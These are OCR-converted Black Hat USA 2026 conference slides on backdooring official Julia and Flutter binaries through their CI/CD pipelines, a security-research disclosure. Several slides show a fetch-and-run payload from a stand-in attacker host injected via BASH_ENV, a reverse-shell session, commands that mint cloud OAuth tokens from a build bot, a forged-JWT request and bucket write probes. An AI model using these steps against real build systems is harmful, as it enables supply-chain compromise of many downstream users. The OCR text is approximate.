---
title: "Born Corrupted How We Backdoored Trusted Language Binaries"
speakers: ["Splitline Ng"]
conference: "Black Hat"
conference_full: "Black Hat USA 2026"
edition: "USA"
year: 2026
source_pdf: "BlackHat_USA_2026_Slides/Splitline Ng_Born Corrupted How We Backdoored Trusted Language Binaries.pdf"
pages: 174
sha256: "650f71794f9f75a72c0a9da640c72eb71767d40fe51c4fd869a1b83e46c875a8"
text_chars: 52112
ocr_pages: 34
has_ocr: true
redacted_secrets: 0
ocr_confidence: 86.8
ocr_unreliable_blocks: 2
ocr_timeouts: 0
pages_recovered_from_text_layer: 3
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T05:46:07Z"
---
# Born Corrupted How We Backdoored Trusted Language Binaries

**Speakers:** Splitline Ng  
**Conference:** Black Hat USA 2026  
**Source:** `BlackHat_USA_2026_Slides/Splitline Ng_Born Corrupted How We Backdoored Trusted Language Binaries.pdf` (174 pages)


## Slide 1

## **Born Corrupted How We Backdoored Trusted Language Binaries**

Tsi-Lin ( **splitline** ) Ng

## Slide 2

You write Python.

## Slide 3

You install packages with pip.

## Slide 4

You audit every package you use.

## Slide 5

But,

## Slide 6

What if,

## Slide 7

What if, You're compromised

before the very first pip install?

## Slide 8

$ whois **splitline** .tw Security Researcher @ DE✓CORE. Member of UNDEFINED Conclave. . Average Web Hacking Enjoyer Ng Tsi-Lin

## Slide 9

## Slide 10


> Recovered by OCR — confidence 86/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
we) axios / axios ~
Code ©) Issues 47
7) Pullrequests 19 G Agents ) Discussions ©) Actions © Security and quality 39 l~ Insights
axios@1.14.1 and axios@0.30.4 are compromised #10604
g ashishkurmi opened on Mar 30
Last edited by ashishkurmi ~ °**
more details: https://www.stepsecurity.io/blog/axios-compromised-on-npm-malicious-versions-drop-remote-access-troj
Most likely, a maintainer's GitHub and npm accounts are compromised as these issues are getting deleted.
| have also reported this as a vulnerability, so that a CVE can be generated.
2110 @ 55 #51 ** 180
```

## Slide 11


> Recovered by OCR — confidence 82/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
we) axios / axios ~ Q Type (/) to search
<> Code ©) Issues 47 3 Pull
RESEARCH
axios@1.14 Mini Shai-Hulud Hits @antv Ecosystem,
639 Compromised npm Package Versions
g ashishkurmi ope Active npm supply chain attack compromises @antv packages
in a fast-moving malicious publish wave tied to Mini Shai-Hulud.
more details: https:/)
| Socket Research Team
Most likely, a mainta
| have also reported
May 19,2026 / 5minread X 8 AA
» echarts-for-react 0% (200) 100) (ico)
latest Source [Jnpm Copy purl @ Security
```

## Slide 12


> Recovered by OCR — confidence 93/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
TrapDoor Supply Chain Attack Spreads Credential-Stealing Malware via
npm, PyPI, and CrateslO
& RavieLakshmanan @ May 25, 2026 Supply Chain Attack / Malware
Top Stories This Week
New Bit2Watt Attack Could Let Cloud
Tenants Disrupt Power Grids Without an
Exploit
Open-Source Android Al Agents Could Let
Invisible Screen Text Run Code on Host
PCs
Hacker Runs Hermes Al Agent
Unattended for Post-Exploitation at Thai
Finance Ministry
Critical SharePoint RCE CVE-2026-50522
Under Active Exploitation After Public
PoC
Microsoft Azure DevOps MCP Flaw Lets
Hidden PR Comments Hijack Al Review
Agents
A new coordinated cross-ecosystem software supply chain attack campaign has targeted npm, PyPI, Researcher Publishes GitLab RCE PoC
and Crates.io to distribute credential-stealing malware. Letting Authenticated Users Run
Commands as Git
Agobe Acrobat Extension Flaw Let
The campaign, codenamed TrapDoor, spans more than 34 malicious packages across over 384
0%
Apache Echarts components for React.
Supply Chain Vulnerability Quality Maintenance
License
to search
```

## Slide 13


> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
TrapDoor Supply Chain Attack Spreads Credential-Stealing Malware via
npm, PyPI, and CrateslO
& RavieLakshmanan @ May 25, 2026 Supply Chain Attack / Malware
+(7) to search
=O
Top Stories This Week
[4 RHSB-2026-006 Supply chain compromise of @redhat-cloud-services npm packages
7 Created Date: June 1, 2026 at 03:50 PM
Updated July 2, 2026 at 08:38 AM
\ Resolved
Status
PAGE NAVIGATION Executive Summary
We have completed our investigation into the compromise that we disclosed on June 1, 2026. Our findings
Executive Summary identified that on May 29, 2026, a GitHub account, compromised via a VS code extension containing
; malware, was used to inject malicious code into packages maintained in a Red Hat GitHub organization
Technical Summary and altered configuration files to infect other developers opening those directories. The compromised VS
code extension was contained on June 1, 2026.
```

## Slide 14

Flutter
proxy.golang.org PyPi JuliaHub pub.dev
http
requests Flux.jl
gorm numpy DataFrames.jl flutter_svg
gin
pgx flask Plots.jl firebase_core

## Slide 15

Flutter
proxy.golang.org PyPi JuliaHub pub.dev
http
requests Flux.jl
gorm numpy DataFrames.jl flutter_svg
gin
pgx flask Plots.jl firebase_core

## Slide 16

Flutter
proxy.golang.org PyPi JuliaHub pub.dev
http
requests Flux.jl
gorm numpy DataFrames.jl flutter_svg
gin
pgx flask Plots.jl firebase_core

## Slide 17

Flutter
proxy.golang.org PyPi JuliaHub pub.dev
http
requests Flux.jl
gorm numpy DataFrames.jl flutter_svg
gin
pgx flask Plots.jl firebase_core

## Slide 18

Flutter proxy.golang.org PyPi JuliaHub pub.dev http requests Flux.jl gorm numpy DataFrames.jl flutter_svg gin pgx flask Plots.jl firebase_core Hack the Source of the Source / BH Asia 2026

## Slide 19

Flutter

> proxy.golang.org PyPi JuliaHub pub.dev http requests Flux.jl gorm numpy DataFrames.jl flutter_svg gin pgx flask Plots.jl firebase_core Hack the Source of the Source / BH Asia 2026

## Slide 20

Flutter
proxy.golang.org PyPi JuliaHub pub.dev
http
requests Flux.jl
gorm numpy DataFrames.jl flutter_svg
gin
pgx flask Plots.jl firebase_core

## Slide 21

Flutter
proxy.golang.org PyPi JuliaHub pub.dev
http
requests Flux.jl
gorm numpy DataFrames.jl flutter_svg
gin
pgx flask Plots.jl firebase_core

## Slide 22

Flutter
proxy.golang.org PyPi JuliaHub pub.dev
http
requests Flux.jl
gorm numpy DataFrames.jl flutter_svg
gin
pgx flask Plots.jl firebase_core

## Slide 23

Flutter
proxy.golang.org PyPi JuliaHub pub.dev
①
③
②
④
http
requests Flux.jl
gorm numpy DataFrames.jl flutter_svg
gin
pgx Agenda�flask :) Plots.jl firebase_core

## Slide 24

Flutter
proxy.golang.org PyPi JuliaHub pub.dev
How?
http
requests Flux.jl
gorm numpy DataFrames.jl flutter_svg
gin
pgx flask Plots.jl firebase_core

## Slide 25

Flutter
proxy.golang.org PyPi JuliaHub pub.dev
How?
http
requests Flux.jl
gorm numpy DataFrames.jl flutter_svg
gin
pgx flask Plots.jl firebase_core

## Slide 26

Flutter
proxy.golang.org PyPi JuliaHub pub.dev
How?
http
requests Flux.jl
gorm numpy DataFrames.jl flutter_svg
gin
pgx flask Plots.jl firebase_core
whatever software or package or stuffs

## Slide 27

CI/CD� Developer� Developers ??? Risks Dashboard Themself Attack Surfaces

## Slide 28

CI/CD� Developer� ~~Developers~~ ??? Risks Dashboard ~~Themself~~

Attack Surfaces

## Slide 29

Developer�
CI/CD�Risks ???
Dashboard
Attack Surfaces

## Slide 30

Developer� CI/CD�Risks ??? Dashboard Attack Surfaces

## Slide 31

CI/CDRisks
Developer
Dashboard
???
Attack Surfaces
Web Hacking
Access Control
Insuff. Flow Control
Poisoned Pipeline

## Slide 32

CI/CDRisks
Developer
Dashboard
???
Attack Surfaces
Web Hacking
Access Control
Insuff. Flow Control
Poisoned Pipeline
Let's Think!

## Slide 33

julia 1

## Slide 34


> Recovered by OCR — confidence 83/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Code Issues 3.7k Pull requests 977 Agents Discussions Actions More v
Filters » Q is:pris:open © Labels 181 [> Milestones 5 New pull request
Author ~ Label ~ Projects ~ Milestones ~ Reviews ~,
```

## Slide 35

Takeover What You Download!


> Recovered by OCR — confidence 89/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ju | la Download Docs Learn Blog Community
Code ls
v1.12.6 (April 9, 2026)
Filters +
Release notes | GitHub tag |
Platform
Auth¢ Windows [help]
macOS (Apple Silicon) [help]
_macOS (Intel x86) [help]
https://julialang-s3.julialang.org/bin/mac/aarch64/1.12/julia-1.12.6-macaarch64.dmg
```

## Slide 36


> Recovered by OCR — confidence 85/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ju | la Download Docs Learn Blog Community
Code Is
v1.12.6 (April 9, 2026)
Release notes | GitHub tag | Sag
Filters +
macOS (Intel x86) [help]
https://julialang-s3.julialang.org/bin/mac/aarch64/1.12/julia-1.12.6-macaarch64.dmg
```

## Slide 37

CI/CD

## Slide 38

Job#1
Job#2
Job#3
…

#### Job�Worker

## Slide 39

Job#1
Job#2
Job#3
…

#### Job�Worker

## Slide 40

/secrets/agent.key
Job#1
Job#2
Job#3
…

#### Job�Worker

## Slide 41

/secrets/agent.key Job#1 Job#2 Job#3 Privileged Normal … env[KEY]=SECRET (unmount) ///�RUN�PIPELINE�/// Job�Worker

## Slide 42

/secrets/agent.key Job#1 ② Cross Job <u>① Compromise</u> Job#2 Job#3 Privileged Normal … env[KEY]=SECRET (unmount) ///�RUN�PIPELINE�/// Job�Worker

## Slide 43

/secrets/agent.key Job#1 ② Cross Job <u>① Compromise</u> Job#2 Job#3 Privileged Normal … env[KEY]=SECRET (unmount) ///�RUN�PIPELINE�/// Job�Worker

## Slide 44

Pull Request

0_webui.yml **meta-data** set

REPO_URL= JuliaCI/julia-buildkite VERSION = <HEAD>

## Slide 45

Pull Request

0_webui.yml **meta-data** set REPO_URL= JuliaCI/julia-buildkite VERSION = <HEAD>

$ git clone <FORK>/julia $ make build build_x86_64-linux-gnu

## Slide 46

0_webui.yml **meta-data** set REPO_URL= JuliaCI/julia-buildkite VERSION = <HEAD> launch_signed_jobs Privileged REPO_URL,VERSION = get_meta() git clone $REPO_URL .buildkite/…/upload_julia.sh upload_x86_64-linux-gnu

Pull Request

$ git clone <FORK>/julia $ make build build_x86_64-linux-gnu

## Slide 47

0_webui.yml **meta-data** set Pull Request REPO_URL= JuliaCI/julia-buildkite VERSION = <HEAD> launch_signed_jobs Privileged REPO_URL,VERSION = get_meta() $ git clone <FORK>/julia git clone $REPO_URL $ make build Depends On .buildkite/…/upload_julia.sh build_x86_64-linux-gnu upload_x86_64-linux-gnu

Pull Request

## Slide 48

0_webui.yml **meta-data** set Pull Request REPO_URL= JuliaCI/julia-buildkite VERSION = <HEAD> launch_signed_jobs Privileged REPO_URL,VERSION = get_meta() $ git clone <FORK>/julia git clone $REPO_URL $ make build .buildkite/…/upload_julia.sh Arbitrary�Execution! build_x86_64-linux-gnu upload_x86_64-linux-gnu

## Slide 49

0_webui.yml **meta-data** set Pull Request REPO_URL= JuliaCI/julia-buildkite VERSION = <HEAD> launch_signed_jobs Privileged REPO_URL,VERSION = get_meta() $ git clone ATTACKER/julia git clone $REPO_URL $ make build .buildkite/…/upload_julia.sh @buildkite-agent meta-data set REPO_URL "ATTACKER/julia-buildkite" @buildkite-agentbuild_x86_64-linux-gnu meta-data set VERSION  "main" upload_x86_64-linux-gnu </> Makefile

## Slide 50

0_webui.yml **meta-data** set Pull Request REPO_URL= ~~JuliaCI/julia-buildkite~~ VERSION = <HEAD> launch_signed_jobs Privileged REPO_URL,VERSION = get_meta() $ git clone ATTACKER/julia git clone $REPO_URL $ make build .buildkite/…/upload_julia.sh @buildkite-agent meta-data set REPO_URL "ATTACKER/julia-buildkite" @buildkite-agentbuild_x86_64-linux-gnu meta-data set VERSION  "main" upload_x86_64-linux-gnu </> Makefile

## Slide 51

0_webui.yml **meta-data** set Pull Request REPO_URL= ~~JuliaCI/julia-buildkite~~ VERSION = <HEAD> launch_signed_jobs Privileged REPO_URL,VERSION = get_meta() $ git clone ATTACKER/julia git clone $REPO_URL $ make build Depends On .buildkite/…/upload_julia.sh build_x86_64-linux-gnu upload_x86_64-linux-gnu

## Slide 52

0_webui.yml
meta-data  set
Pull Request REPO_URL=  JuliaCI/julia-buildkite
VERSION = <HEAD>
launch_signed_jobs
Privileged
REPO_URL,VERSION = get_meta()
$ git clone <FORK>/julia
git clone $REPO_URL
$ make build
Depends On
.buildkite/…/upload_julia.sh
build_x86_64-linux-gnu  upload_x86_64-linux-gnu
Malicious!
ATTACKER/julia-buildkite

## Slide 53

|**meta-data**set
REPO_URL=~~JuliaCI/julia-buildkite~~
VERSION = <HEAD>
0_webui.yml
Pull Request
**ATTACKER/julia-b**|**uildkite**|
|---|---|
|launch_signed_j|obs|
||Privileged|
|$ git clone <FORK>/julia
REPO_URL,VERSION= g|et_meta()|
|Depends On

$ make build
git clone$REPO_URL|Malicious!|
|

.buildkite/
…
/upload_|julia.sh|
|build_x86_64-linux-gnu
upload_x86_64-lin|ux-gnu|

## Slide 54

0_webui.yml **meta-data** set **ATTACKER/julia-buildkite** Pull Request REPO_URL= ~~JuliaCI/julia-buildkite~~ VERSION = <HEAD> launch_signed_jobs Privileged REPO_URL,VERSION = get_meta() $ git clone <FORK>/julia git clone $REPO_URL $ make build Depends On .buildkite/…/upload_julia.sh build_x86_64-linux-gnu upload_x86_64-linux-gnu

## Slide 55

0_webui.yml **meta-data** set **ATTACKER/julia-buildkite** Pull Request REPO_URL= ~~JuliaCI/julia-buildkite~~ VERSION = <HEAD>

launch_signed_jobs Privileged REPO_URL,VERSION = get_meta() $ git clone <FORK>/julia git clone $REPO_URL $ make build Depends On .buildkite/…/upload_julia.sh build_x86_64-linux-gnu upload_x86_64-linux-gnu

## Slide 56

0_webui.yml **meta-data** set **ATTACKER/julia-buildkite** Pull Request REPO_URL= ~~JuliaCI/julia-buildkite~~ VERSION = <HEAD>

launch_signed_jobs

$ git clone <FORK>/julia $ make build

Privileged REPO_URL,VERSION = get_meta()

git clone $REPO_URL Depends On .buildkite/…/upload_julia.sh

build_x86_64-linux-gnu upload_x86_64-linux-gnu

## Slide 57

julia Hacked 1

## Slide 58

Flutter 2

## Slide 59


> Recovered by OCR — confidence 82/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
= ©) flutter / flutter ~
Code Issues 5k+ Pull requests
Filters » Q is:pris:open
Author + Label + Projects +
518
Q 8
Agents Actions
© Labels 492
Milestones ~
Projects
[> Milestones 9
Reviews ~
Assignee ~
New pull request
Sort ~
```

## Slide 60


> Recovered by OCR — confidence 86/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Install manually
Install and set up Flutter
To install the Flutter SDK, download the latest
Install with VS Code
SDK archive stored.
= flutter / fl) | Upgrade SDK
€) 1 Download the Flutter SDK bundle
Add to path
Code Issues 5k+ Download the following installation bunc
Troubleshoot
Uninstall SDK flutter_windows_3.44.8-stable.zip
Filters » Q is:pris
(© Resources v
2 Create gz r to store the SDK
https://storage.googleapis.com/flutter_infra_release/releases/stable/windq windows_3.44.8-stable.zip ,
Author + Label + Projects ~ Milestong
```

## Slide 61

CI/CD

## Slide 62

CI/CD

## Slide 63

Recipe (CI
Steps)
. 1. checkout
lucicfg / *.star
2. compile
Gerrit 3. test
4. upload result
Swarming
CV schedule
Buildbucket
Change Verifier task
Bot Bot Bot
CIPD
Task workspace on Bot
runtimes/tools
Agent compile/test/…
CAS
Build/task artifact
Local Auth RPC

## Slide 64

Job#1
Job#2
Job#3
…
secrets / token

#### Job�Worker

## Slide 65

Job#1 Job#2 Job#3 … LUCI

secrets / token Layered Universal Continuous Integration Job�Worker

## Slide 66

##### Google Cloud Platform

Job#1 Job#2 Job#3 … Job#1 Prod Task Job#2 LUCI_CONTEXT Job#3 Based on task type … Bot Job�Worker Try Task

## Slide 67

##### Google Cloud Platform

Job#1
Job#2
Job#3
…
Job#1
Prod Task
Job#2
Job#3
…
Bot
Job�Worker
Try Task

Local Auth RPC
Auth Service Account
LUCI_CONTEXT
Based on task type

## Slide 68

Job#1 Google Cloud Platform
Job#2
Job#3
Local Auth RPC
…
Job#1 Auth Service Account
Prod Task
Job#2
LUCI_CONTEXT
Job#3
Based on task type
…
Bot
Job�Worker
Try Task
Cross Task

## Slide 69

Job#1 Google Cloud Platform
Job#2
Job#3
Local Auth RPC
…
Job#1 Auth Service Account
Prod Task
Job#2
LUCI_CONTEXT
(Something Job#3
Based on task type
Shared)
…
Bot
Job�Worker
Try Task
Cross Task

## Slide 70

##### Google Cloud Platform

Job#1
Job#2
Job#3
…
Job#1
Prod Task
Job#2
(Something Job#3
Shared)
…
Bot
Job�Worker
Try Task
Cross Task

Local Auth RPC Auth Service Account LUCI_CONTEXT Based on task type

## Slide 71

final content = await githubFileContent( slug, ciYamlPath, // ".ci.yaml" ref: commitSha, // <- fork's SHA: to attacker's file );

## Slide 72

- name: Linux framework_tests_libraries recipe: flutter/flutter_drone timeout: 60 properties: # ... tags: > final content = await githubFileContent( ["framework","hostonly","shard", "linux"] slug, **+    env_variables: >- +      {** ciYamlPath, // ".ci.yaml" **+        "BASH_ENV": "$(curl https://attacker.tld/shell.sh | sh)** ref: commitSha, // <- fork's SHA: to attacker's file **+      }** ); **+    contexts: >- +      ["metric_center_token"]** runIf: - dev/** - packages/flutter/** # ...

## Slide 73

- name: Linux framework_tests_libraries recipe: flutter/flutter_drone timeout: 60 properties: # ... tags: > final content = await githubFileContent( ["framework","hostonly","shard", "linux"] slug, **+    env_variables: >- +      {** ciYamlPath, // ".ci.yaml" **+        "BASH_ENV": "$(curl https://attacker.tld/shell.sh | sh)** ref: commitSha, // <- fork's SHA: to attacker's file **+      }** ); Open PR! **+    contexts: >- +      ["metric_center_token"]** runIf: - dev/** - packages/flutter/** # ...

## Slide 74

- name: Linux framework_tests_libraries recipe: flutter/flutter_drone timeout: 60 properties: # ... tags: > final content = await githubFileContent( ["framework","hostonly","shard", "linux"] slug, **+    env_variables: >- +      {** ciYamlPath, // ".ci.yaml" **+        "BASH_ENV": "$(curl https://attacker.tld/shell.sh | sh)** ref: commitSha, // <- fork's SHA: to attacker's file **+      }** ); Open PR! **+    contexts: >- +      ["metric_center_token"]** runIf: - dev/** - packages/flutter/** # ...

## Slide 75

- name: Linux framework_tests_libraries recipe: flutter/flutter_drone

timeout: 60 properties: # ... tags: > final content = await githubFileContent( ["framework","hostonly","shard", "linux"] slug, **+    env_variables: >- +      {** ciYamlPath, // ".ci.yaml" **+        "BASH_ENV": "$(curl https://attacker.tld/shell.sh | sh)** ref: commitSha, // <- fork's SHA: to attacker's file **+      }** ); Open PR! **+    contexts: >- +      ["metric_center_token"]** runIf:

- dev/** - packages/flutter/**

# ...

## Slide 76

- name: Linux framework_tests_libraries recipe: flutter/flutter_drone

timeout: 60 properties: # ... tags: > final content = await githubFileContent( ["framework","hostonly","shard", "linux"] slug, **+    env_variables: >- +      {** ciYamlPath, // ".ci.yaml" **+        "BASH_ENV": "$(curl https://attacker.tld/shell.sh | sh)** ref: commitSha, // <- fork's SHA: to attacker's file **+      }** ); Open PR! **+    contexts: >- +      ["metric_center_token"]** runIf: - dev/** - packages/flutter/**

# ...

## Slide 77


> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Roll Skia from f886711f9453 to fe9e9f229487 (4 revisions) #1
eae CMe OEniltilps wants to merge 2 commits into flutter:master from @Eniltilps:patch-1 (QO)
) Conversation 0 © Commits 2 —l Checks 151 Files changed 1
OEniltilps commented on Mar 5
Replace this paragraph with a description of what this PR is changing or adding, and why. Consider including before/after
screenshots.
List which issues are fixed by this PR. You must list at least one issue. An issue is n¢ PR fixes something
trivial like a typo.
If you had to change anything in the flutter/tests repo, include a link to the mig aking change
```

## Slide 78

final content = await githubFileContent( slug, ciYamlPath, // ".ci.yaml" ref: commitSha, // <- fork's SHA: to attacker's file

);


> Recovered by OCR — confidence 84/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ee0e 8 rlwrap (ssh)
id
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
inet 127.0.0.1/8 scope host lo
valid_lft forever preferred_lft forever
inet6 ::1/128 scope host
valid_lft forever preferred_lft forever
2: ens4: <BROADCAST ,MULTICAST,UP,LOWER_UP> mtu 146@ qdisc mq state UP group default qlen 1000
inet 10.128.0.73/32 metric 10@ scope global dynamic ens4
valid_lft 3264sec preferred_lft 3264sec
inet6 fe8&@: :4001:aff:fe80:49/64 scope link
valid_lft forever preferred_lft forever
ps
PID TTY TIME CMD
1084 ? 00:00:14 python3
73742 ? 00:00:00 systemd
73744 ? 00:00:00 Csd-pam) R
73750 ? @@:00:08 chromebuild-sta e€verse Shel]!
74714 ? 00:08:04 python3 e
```

## Slide 79


> Recovered by OCR — confidence 77/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
eee a (s} rlwrap (ssh) #2
id
uid=100@Cchrome-bot) gid=100@Cchrome-bot) groups=1000Cchrome-bot) ,109Ckvm)
curl -s -X POST \
-H "Content-Type: application/json" \
\"scopes\": [
\"https://www.googleapis.com/auth/cloud-platform\",
\"secret\": \"ik/ORYUTeygi5+wB8g1/niL91PxVgQP84zDmt TUG726M7Nc fdzDMVeRGXXLVmSXU\" ,
\"account_id\": \"task\"
"http://127.0.0.1:39979/rpc/LuciLocalAuthService. GetOAuthToken"
```

## Slide 80


> Recovered by OCR — confidence 78/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
+ ~ curl -sS -X POST \
-H "Authorization: Bearer $TOKEN" \
-H "Content-Type: text/plain" \
--data 'pwned'" \
"kind": "storage#object”,
"id": "flutter_archives_v2/downLoad.flutter.io/io0/pwned.txt/1772713469572856",
"selfLink": "https://www.googleapis.com/storage/v1/b/flutter_archives_v2/o/downLoc
eneration=1772713469572856&alt=media",
"generation": "1772713469572856",
"“metageneration”: "1",
"contentType": "text/plain",
"size": "5",
ou © 3/05, 8:27PM s
```

## Slide 81

Write to gs://flutter_archives_v2


> Recovered by OCR — confidence 84/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
S G ~ https://www.googleapis.com/download/storage/v1/b/flutter_archives_v2/o/download.flutter.io%2Fio%2Fpwned.txt?
pwned
Write to gs://flutter_archives v2
"storageClass": "STANDARD",
"Size": "5",
© 3/05, 8:27PM
```

## Slide 82

# Pwned?

Write to gs://flutter_archives_v2


> Recovered by OCR — confidence 82/100 on the text kept, 62/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Write to gs://flutter_archives v2
"storageClass": "STANDARD",
"size": "5",
© 3/05, 8:27PM a
```

## Slide 83

- name: Linux framework_tests_libraries

recipe: flutter/flutter_drone timeout: 60 properties: # ... final content tags: > = await githubFileContent( final content = await githubFileContent( slug,["framework","hostonly","shard", "linux"] slug, **+    env_variables: >-** Pwned? ciYamlPath, // ".ci.yaml" **+      {** ciYamlPath, // ".ci.yaml" ref: commitSha, // <- fork's SHA: to attacker's file **+        "BASH_ENV": "$(curl https://attacker.tld/shell.sh | sh)** ref);: commitSha, // <- fork's SHA: to attacker's file **+      } +    contexts: >-** Write to gs://flutter_archives_v2 ); **+      ["metric_center_token"]** runIf:

- dev/** - packages/flutter/** # ...

## Slide 84

- name: Linux framework_tests_libraries recipe: flutter/flutter_drone timeout: 60 properties: # ... final content tags: > = await githubFileContent( final content = await githubFileContent( slug,["framework","hostonly","shard", "linux"] slug, **+    env_variables: >-** Pwned? ciYamlPath, // ".ci.yaml" **+      {** ciYamlPath, // ".ci.yaml" ref: commitSha, // <- fork's SHA: to attacker's file **+        "BASH_ENV": "$(curl https://attacker.tld/shell.sh | sh)** ref);: commitSha, // <- fork's SHA: to attacker's file **+      } +    contexts: >-** Write to gs://flutter_archives_v2 ); **+      ["metric_center_token"]** **. gs://flutter_infra_release** runIf: - dev/** - packages/flutter/** # ...

## Slide 85

Job#1
Job#2
Local Auth RPC
Job#3
…
Auth Service Account
Job#1
Prod Task
Job#2 LUCI_CONTEXT
Based on task type
(Something
Job#3
Shared)
…
Bot
Job�Worker
Try Task
Cross Task

## Slide 86

Job#1
Job#2
Local Auth RPC
Job#3
…
Auth Service Account
Job#1
Prod Task
Job#2 LUCI_CONTEXT
Based on task type
(Something
Job#3
Shared)
…
Bot
Job�Worker
Try Task
Cross Task

## Slide 87

Job#1
Job#2
Local Auth RPC
Job#3
…
Auth Service Account
Job#1
Prod Task
Job#2 LUCI_CONTEXT
Based on task type
flutter_archives_v2 Job#3
…
Bot
Job�Worker
Try Task
Cross Task

## Slide 88

Job#1
Job#2
Local Auth RPC
Job#3
…
Auth Service Account
Job#1
Prod Task
Job#2 LUCI_CONTEXT
Based on task type
flutter_archives_v2 Job#3
…
Bot
Job�Worker
Try Task
Cross Task

## Slide 89

Job#1 Job#2 Local Auth RPC Job#3 mount_cache('builder') … _cache_path('builder') Auth Service Account Job#1 Prod Task gs://flutter_archives_v2/caches/builder-linux.json hashes = {"builder": <digest>, Job#2 LUCI_CONTEXT "git": <digest>} Based on task type [CACHE]/builder ← Flutter Engine flutter_archives_v2 Job#3 [CACHE]/git … B ot Job�Worker Try Task git('checkout', '--force', pin or branch, '--', cwd=sln_dir)

## Slide 90

Job#1 Job#2 Local Auth RPC Job#3 mount_cache('builder') … _cache_path('builder') Auth Service Account Job#1 Prod Task gs:// flutter_archives_v2/ caches/builder-linux.json hashes = {"builder": <digest>, Job#2 LUCI_CONTEXT "git": <digest>} Based on task type [CACHE]/builder ← Flutter Engine flutter_archives_v2 Job#3 [CACHE]/git … B ot Job�Worker Try Task git('checkout', '--force', pin or branch, '--', cwd=sln_dir)

## Slide 91

Job#1
Job#2
Local Auth RPC
Job#3
mount_cache('builder')
…  _cache_path('builder')
Auth Service Account
Job#1
Prod Task gs:// flutter_archives_v2/ caches/builder-linux.json
hashes = {"builder": <digest>,
Job#2 LUCI_CONTEXT
"git": <digest>}
Based on task type
[CACHE]/builder ← Flutter Engine
flutter_archives_v2 Job#3
[CACHE]/git
…
B ot
Job�Worker
Try Task
git('checkout', '--force', pin or branch, '--', cwd=sln_dir)
Cross Task

## Slide 92

Job#1 Job#2 Local Auth RPC Job#3 mount_cache('builder') … _cache_path('builder') Auth Service Account Job#1 Prod Task gs:// flutter_archives_v2/ caches/builder-linux.json hashes = {"builder": <digest>, Job#2 LUCI_CONTEXT "git": <digest>} Based on task type [CACHE]/builder ← Flutter Engine flutter_archives_v2 Job#3 Compromised! [CACHE]/git … B ot Job�Worker Try Task **git('checkout', '--force', pin or branch, '--', cwd=sln_dir)**

## Slide 93

**Cocoon Flutter Build Dashboard**


> Recovered by OCR — confidence 93/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Flutter Build Dashboard — Cocoon
PreSubmit
Manual Tree Status
Framework Benchmarks
Engine Benchmarks
Source Code
About Flutter Build Dashboard —
Cocoon
Flutter Build Dashboard
```

## Slide 94

if (email.endsWith( **'@google.com'** ) || await _isAllowedCached(token.email)) { return AuthenticatedContext(...); }

## Slide 95

Future<TokenInfo> decodeAndVerify(String jwtString) async { final now = _now(); **final = await JsonWebToken. jwt decodeAndVerify(jwtString, keyStore); verifyJwtClaims(jwt.claims, now);** return TokenInfo.fromJson(jwt.claims.toJson());

}

## Slide 96

Future<TokenInfo> decodeAndVerify(String jwtString) async { final now = _now(); **final = await JsonWebToken. jwt decodeAndVerify(jwtString, keyStore); verifyJwtClaims(jwt.claims, now);** return TokenInfo.fromJson(jwt.claims.toJson());

}

## Slide 97


> Recovered by OCR — confidence 87/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
eee «2 8 rlwrap (ssh) * ..-Sec/_reports (-zsh)
+» _reports curl -s -H "X-Flutter-IdToken: " "https://flutter-dashboard.appspot.com/api/get-tree-status?repo=flutter" -i
HTTP/2 401
date: Tue, 17 Mar 2026 16:46:51 GMT
content-type: text/plain; charset=utf-8
x-frame-options: SAMEORIGIN
x-xss-protection: 1; mode=block
x-content-type-options: nosniff
via: 1.1 google
alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
User is not signed ing
```

## Slide 98


> Recovered by OCR — confidence 81/100 on the text kept, 60/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
eee 8 P| «.-Sec/_reports (-zsh)
> _reports curl -s -H "X-Flutter-IdToken: " "https://flutter-dashboard.appspot.com/api/get-tree-status?repo=flutter” -i
HTTP/2 401
date: Tue, 17 Mar 2026 16:46:51 GMT
content-type: text/plain; charset=utf-8
x-frame-options: SAMEORIGIN
x-xss-protection: 1; mode=block
x-content-type-options: nosniff
via: 1.1 google
alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
User is not signed ing
+ _reports curl -s -H "X-Flutter-IdToken: $(python forge_cocoon_jwt.py)" "https://flutter-dashboard.appspot.com/api/get-
ng for LSC - lints https://github.com/flutter/flutter/issues/178827"}, {"createdOn" :"2025-@7-07T19:27:05 .346994Z" "status":
duled Dart format 3.8"}12
+ _reports |
```

## Slide 99


> Recovered by OCR — confidence 89/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
TOKEN=$CLuci-auth token -scopes https://www.googleapis.com/auth/cloud-platform)
for B in flutter_infra_release download.flutter.io flutter_archives_v2; do
echo "$B: $Ccurl -s -H "Authorization: Bearer $TOKEN" "https://storage.googleapis.com/s
ge.objects.create" | grep -o 'storage.objects.create')"
done
